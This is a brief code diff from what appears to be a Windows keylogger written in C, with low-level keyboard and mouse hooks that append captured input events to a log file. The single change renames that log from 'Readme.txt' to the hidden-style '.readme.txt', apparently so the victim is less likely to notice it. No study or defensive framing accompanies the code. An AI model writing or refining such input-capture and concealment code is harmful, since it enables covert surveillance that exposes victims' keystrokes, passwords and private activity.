@@ -102,7 +102,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0) {
-        FILE *log = fopen("Readme.txt", "a+");
+        FILE *log = fopen(".readme.txt", "a+");
         if (log) {
             switch (wParam) {
                 case WM_LBUTTONDOWN:
